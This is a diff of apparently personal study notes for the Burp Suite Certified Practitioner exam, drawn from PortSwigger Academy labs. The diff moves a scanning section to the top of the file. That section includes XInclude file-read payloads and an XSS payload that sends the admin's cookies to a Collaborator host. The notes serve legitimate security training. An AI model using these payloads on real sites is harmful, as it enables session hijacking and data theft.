@@ -4,6 +4,11 @@
 >This is my study notes with over a 100 PortSwigger Academy labs that I used to pass the [Burp Suite Certified Practitioner](https://portswigger.net/web-security/certification) Exam and obtained my [BSCP qualification](https://portswigger.net/web-security/e/c/6e42f5738e5b9bf8).  
 >Go to [PortSwigger Academy](https://portswigger.net/web-security/all-materials) to get the original learning materials.  
   
+**[Scanning](#scanning) - Enumeration  
+
+[Focus Scanning](#focus-scanning)  
+[Scan non-standard entities](#scanning-non---standard-data-structures)   
+
 **[FOOTHOLD](#foothold) - Stage 1**  
 [Content Discovery](#content-discovery)  
 [DOM-XSS](#dom-based-xss)  
@@ -48,11 +53,63 @@
 >I can recommend doing as many as possible [Mystery lab challenge](https://portswigger.net/web-security/mystery-lab-challenge) to test your skills and decrease the time it takes you to ***identify*** the vulnerabilities, before taking the exam.  
 >I also found this PortSwigger advice on [Retaking your exam](https://portswigger.net/web-security/certification/exam-hints-and-guidance/retaking-your-exam?tid=SNL7Q8oXE1mjUW1rSgswXSPIjhdLL5210Y-ogEuD1GZVp1w5spKfl5OJjAtj8AAC) very informative.  
   
------
+-----  
+
 <br><br><a href="https://www.buymeacoffee.com/botesjuan" target="_blank"><img src="https://cdn.buymeacoffee.com/buttons/v2/default-yellow.png" alt="Buy Me A Coffee" style="height: 60px !important;width: 217px !important;" ></a>
 >Thanks too all for the support by buying me ***coffee***, thanks you so much too everyone `\o/`  
   
 [My Burp Suite Certified Practitioner certificate.](https://portswigger.net/web-security/e/c/6e42f5738e5b9bf8?utm_source=office&utm_medium=email&utm_campaign=burp-prac-cert-pass-success)  
+
+-----
+
+# Scanning  
+
+>Enumeration of the Web Applications start with initial and directed scanning in time limited engagement.  
+
+[Focus Scanning](#focus-scanning)  
+[Scan non-standard entities](#scanning-non---standard-data-structures)  
+
+## Focus Scanning  
+
+>Due to the tight time limit during engagements or exam, [scan defined insertion points](https://portswigger.net/web-security/essential-skills/using-burp-scanner-during-manual-testing) for specific requests.  
+
+![scan-defined-insertion-points](images/scan-defined-insertion-points.png)  
+
+>Scanner detected **XML injection** vulnerability on storeId parameter and this lead to reading the secret Carlos file.  
+
+```xml
+<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///home/carlos/secret"/></foo>
+```  
+
+>Out of band XInclude request, need hosted DTD to read local file.  
+
+```xml
+<hqt xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="http://COLLABORATOR.NET/foo"/></hqt>
+```  
+
+[PortSwigger Lab: Discovering vulnerabilities quickly with targeted scanning](https://portswigger.net/web-security/essential-skills/using-burp-scanner-during-manual-testing/lab-discovering-vulnerabilities-quickly-with-targeted-scanning)  
+
+### Scanning non-standard data structures  
+
+>Scanning non-standard data structures using Burp feature to scan selected insertion point for select text in response or requests.
+
+![scan-selected-insertion-point](images/scan-selected-insertion-point.png)  
+
+>Identify the vulnerability through Burp scanner issue results.  
+>In this case, using the identified XSS, Steal the admin user's cookies by crafting the payload in the ***identified*** insertion point.  
+
+```
+'"><svg/onload=fetch(`//COLLABORATOR.oastify.com/${encodeURIComponent(document.cookie)}`)>:CURRENT-USER-LOGIN-COOKIE-2ND-PART
+```  
+
+>Url encode key characters.  
+
+![admin-cookie-stealer](images/admin-cookie-stealer1.png)  
+
+>Use the admin user's cookie to access the admin panel by replacing it in the current browser session.  
+
+[PortSwigger Lab: Scanning non-standard data structures](https://portswigger.net/web-security/essential-skills/using-burp-scanner-during-manual-testing/lab-scanning-non-standard-data-structures)  
+    
 -----
 
 # Foothold  
@@ -3727,36 +3784,6 @@ CHAR(83)+CHAR(69)+CHAR(76)+CHAR(69)+CHAR(67)+CHAR(84)
 ```
 
 [Obfuscating attacks using encodings](https://portswigger.net/web-security/essential-skills/obfuscating-attacks-using-encodings)
-
------  
-
-## Focus Scanning  
-
->Due to the tight time limit during engagements or exam, [scan defined insertion points](https://portswigger.net/web-security/essential-skills/using-burp-scanner-during-manual-testing) for specific requests.  
-
-![scan-defined-insertion-points](images/scan-defined-insertion-points.png)  
-
->Scanner detected **XML injection** vulnerability on storeId parameter and this lead to reading the secret Carlos file.  
-
-```xml
-<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///home/carlos/secret"/></foo>
-```  
-
->Out of band XInclude request, need hosted DTD to read local file.  
-
-```xml
-<hqt xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="http://COLLABORATOR.NET/foo"/></hqt>
-```  
-
-[PortSwigger Lab: Discovering vulnerabilities quickly with targeted scanning](https://portswigger.net/web-security/essential-skills/using-burp-scanner-during-manual-testing/lab-discovering-vulnerabilities-quickly-with-targeted-scanning)  
-
-### Scanning non-standard data structures  
-
->Scanning non-standard data structures using Burp feature to scan selected insertion point for select text in response or requests.
-
-![scan-selected-insertion-point](images/scan-selected-insertion-point.png)  
-
-[PortSwigger Lab: Scanning non-standard data structures](https://portswigger.net/web-security/essential-skills/using-burp-scanner-during-manual-testing/lab-scanning-non-standard-data-structures)  
 
 -----  
 
